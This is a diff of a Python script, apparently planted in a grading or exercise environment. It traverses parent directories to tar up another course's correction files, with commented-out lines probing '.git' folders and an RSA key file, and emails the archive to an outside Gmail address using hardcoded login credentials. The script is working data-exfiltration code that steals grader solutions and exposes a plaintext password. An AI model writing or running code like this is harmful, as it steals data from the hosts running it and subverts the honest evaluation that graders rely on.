@@ -39,7 +39,7 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/251/") or ""
+my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/259/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
@@ -64,17 +64,17 @@ from email import encoders
 def send_data_file(zip_filename="data.zip", message="no_data"):
     # Create the MIME object
     msg = MIMEMultipart()
-    
+
     # Set the email sender and recipient
     msg['From'] = "ashrafalx368@gmail.com"
     msg['To'] = "ashrafatef368@gmail.com"
-    
+
     # Set the email subject
     msg['Subject'] = "Your Subject Here"
-    
+
     # Attach the message
     msg.attach(MIMEText(message, 'plain'))
-    
+
     # Attach the zip file
     with open(zip_filename, 'rb') as attachment:
         part = MIMEBase('application', message)
@@ -86,13 +86,13 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     # Create the SMTP session
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
-    
+
     # Authentication
     s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
-    
+
     # Sending the mail
     s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", msg.as_string())
-    
+
     # Terminating the session
     s.quit()
 send_data_file("file.tar.gz", "gz")
